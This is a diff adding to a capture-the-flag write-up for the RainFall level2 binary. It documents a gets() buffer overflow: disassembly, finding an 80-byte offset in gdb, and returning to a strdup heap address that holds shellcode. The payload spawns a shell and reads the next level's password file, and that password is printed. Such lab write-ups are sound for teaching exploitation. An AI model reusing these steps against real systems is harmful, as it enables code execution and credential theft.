@@ -51,5 +51,181 @@ level2@RainFall:~$ objdump -d intel  ./level2 -M intel
  804854e:	90                   	nop
  804854f:	90                   	nop
 ```
-p function is of interest
+We notice call to gets, puts and strdup. p function is of interest. It is called by main and uses gets function that we know is vulnerable to buffer overflow attack.
+However, it seems there is a check here:
+```asm
+ 80484f8:	8b 45 f4             	mov    eax,DWORD PTR [ebp-0xc]
+ 80484fb:	25 00 00 00 b0       	and    eax,0xb0000000
+ 8048500:	3d 00 00 00 b0       	cmp    eax,0xb0000000
+ 8048505:	75 20                	jne    8048527 <p+0x53>
+```
+It seems to check if eax contains an address that belongs to the range 0xb0000000 - 0xbfffffff which is the range of Kernel or Stack addresses.
+Since there are no hidden function with call to system like level1, we will have to inject our own.
+First we will try to hijack the eax return register to exploit gets vulnerability. The return address will be the buffer of gets and the buffer will contain shellcode.
+We use the same tactic as level1 to determine the offset:
+```
+level2@RainFall:~$ python /tmp/pattern3.py
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+level2@RainFall:~$ gdb -q ./level2
+Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
+(gdb) b main
+Breakpoint 1 at 0x8048542
+(gdb) b p
+Breakpoint 2 at 0x80484da
+(gdb) r
+Starting program: /home/user/level2/level2
 
+Breakpoint 1, 0x08048542 in main ()
+(gdb) s
+Single stepping until exit from function main,
+which has no line number information.
+
+Breakpoint 2, 0x080484da in p ()
+(gdb) disas main
+Dump of assembler code for function main:
+   0x0804853f <+0>:     push   %ebp
+   0x08048540 <+1>:     mov    %esp,%ebp
+   0x08048542 <+3>:     and    $0xfffffff0,%esp
+   0x08048545 <+6>:     call   0x80484d4 <p>
+   0x0804854a <+11>:    leave
+   0x0804854b <+12>:    ret
+End of assembler dump.
+(gdb) b *0x0804854b
+Breakpoint 3 at 0x804854b
+(gdb) c
+Continuing.
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+Program received signal SIGSEGV, Segmentation fault.
+0x37634136 in ?? ()
+(gdb) quit
+A debugging session is active.
+
+        Inferior 1 [process 12242] will be killed.
+
+Quit anyway? (y or n) y
+level2@RainFall:~$ python /tmp/pattern3.py > /tmp/2.txt
+level2@RainFall:~$ python /tmp/pattern3.py /tmp/2.txt 0x37634136
+offset found at: 80
+```
+We find an offset at 80 bytes. Lets try to inject shell code to the return address:
+```
+level2@RainFall:~$ gdb -q ./level2
+Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
+(gdb) b main
+Breakpoint 1 at 0x8048542
+(gdb) b p
+Breakpoint 2 at 0x80484da
+(gdb) r
+Starting program: /home/user/level2/level2
+
+Breakpoint 1, 0x08048542 in main ()
+(gdb) s
+Single stepping until exit from function main,
+which has no line number information.
+
+Breakpoint 2, 0x080484da in p ()
+(gdb) disas p
+Dump of assembler code for function p:
+   0x080484d4 <+0>:     push   %ebp
+   0x080484d5 <+1>:     mov    %esp,%ebp
+   0x080484d7 <+3>:     sub    $0x68,%esp
+=> 0x080484da <+6>:     mov    0x8049860,%eax
+   0x080484df <+11>:    mov    %eax,(%esp)
+   0x080484e2 <+14>:    call   0x80483b0 <fflush@plt>
+   0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax
+   0x080484ea <+22>:    mov    %eax,(%esp)
+   0x080484ed <+25>:    call   0x80483c0 <gets@plt>
+   0x080484f2 <+30>:    mov    0x4(%ebp),%eax
+   0x080484f5 <+33>:    mov    %eax,-0xc(%ebp)
+   0x080484f8 <+36>:    mov    -0xc(%ebp),%eax
+   0x080484fb <+39>:    and    $0xb0000000,%eax
+   0x08048500 <+44>:    cmp    $0xb0000000,%eax
+   0x08048505 <+49>:    jne    0x8048527 <p+83>
+   0x08048507 <+51>:    mov    $0x8048620,%eax
+   0x0804850c <+56>:    mov    -0xc(%ebp),%edx
+   0x0804850f <+59>:    mov    %edx,0x4(%esp)
+   0x08048513 <+63>:    mov    %eax,(%esp)
+   0x08048516 <+66>:    call   0x80483a0 <printf@plt>
+   0x0804851b <+71>:    movl   $0x1,(%esp)
+   0x08048522 <+78>:    call   0x80483d0 <_exit@plt>
+   0x08048527 <+83>:    lea    -0x4c(%ebp),%eax
+   0x0804852a <+86>:    mov    %eax,(%esp)
+   0x0804852d <+89>:    call   0x80483f0 <puts@plt>
+   0x08048532 <+94>:    lea    -0x4c(%ebp),%eax
+   0x08048535 <+97>:    mov    %eax,(%esp)
+   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
+   0x0804853d <+105>:   leave
+   0x0804853e <+106>:   ret
+End of assembler dump.
+```
+we want the return buffer so we place a bp right after the call to gets: 0x080484f2
+```
+(gdb) b *0x080484f2
+Breakpoint 3 at 0x80484f2
+(gdb) s
+Single stepping until exit from function p,
+which has no line number information.
+aaaaaaa
+
+Breakpoint 3, 0x080484f2 in p ()
+(gdb) i r
+eax            0xbffff6dc       -1073744164
+ecx            0xb7fd28c4       -1208145724
+edx            0xbffff6dc       -1073744164
+ebx            0xb7fd0ff4       -1208152076
+esp            0xbffff6c0       0xbffff6c0
+ebp            0xbffff728       0xbffff728
+esi            0x0      0
+edi            0x0      0
+eip            0x80484f2        0x80484f2 <p+30>
+eflags         0x200282 [ SF IF ID ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+```
+in eax the buffer is at address 0xbffff6dc, lets try to inject here.
+Our shell code is 21 bytes long, the limit is 80 bytes so we first have our 21 bytes shellcode then 59 random bytes then 4 bytes for the address
+```
+level2@RainFall:~$ python /tmp/exploit3.py  0xbffff6dc 59
+crafting payload...
+done:
+/tmp/payload_level2
+level2@RainFall:~$ cat /tmp/payload_level2 - | ./level2
+
+(0xbffff6dc)
+
+```
+it failed because we cant write on stack, but on heap it seems to be ok. strdup returns the following address:
+```
+level2@RainFall:~$ ltrace ./level2
+__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
+fflush(0xb7fd1a20)                       = 0
+gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5
+TEST!
+)                                        = 0xbffff6fc
+puts("TEST!"
+TEST!
+)                                        = 6
+strdup("TEST!")                          = 0x0804a008
++++ exited (status 8) +++
+```
+We try again with this malloc'ed address:
+```
+level2@RainFall:~$ python /tmp/exploit3.py  0x0804a008 59
+crafting payload...
+done:
+/tmp/payload_level2
+level2@RainFall:~$ cat /tmp/payload_level2 - | ./level2
+
+j
+ X�Rh//shh/bin��1�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
+id
+uid=2021(level2) gid=2021(level2) euid=2022(level3) egid=100(users) groups=2022(level3),100(users),2021(level2)
+cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+```
